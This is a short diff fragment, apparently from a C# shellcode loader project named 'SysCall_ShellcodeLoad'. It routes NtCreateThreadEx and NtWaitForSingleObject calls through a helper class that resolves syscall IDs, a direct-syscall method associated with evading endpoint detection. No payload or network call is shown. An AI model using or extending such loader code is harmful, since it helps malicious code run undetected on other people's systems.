@@ -72,7 +72,7 @@ namespace SysCall_ShellcodeLoad
             uint STANDARD_RIGHTS_ALL = 0x001F0000;
             uint SPECIFIC_RIGHTS_ALL = 0x0000FFFF;
 
-            uint hThreadResult = NtCreateThreadEx(   
+            uint hThreadResult = Auto_NativeCode.NtCreateThreadEx(   
                 out hThread,
                 STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, 
                 IntPtr.Zero, 
@@ -87,7 +87,7 @@ namespace SysCall_ShellcodeLoad
              );
 
             Console.WriteLine("hThreadResult: " + hThreadResult);
-            uint result = NtWaitForSingleObject(hThread, true, 0);
+            uint result = Auto_NativeCode.NtWaitForSingleObject(hThread, true, 0);
             
             // Auto_NativeCode.GetSyscallID("NtAllocateVirtualMemory");
             return;
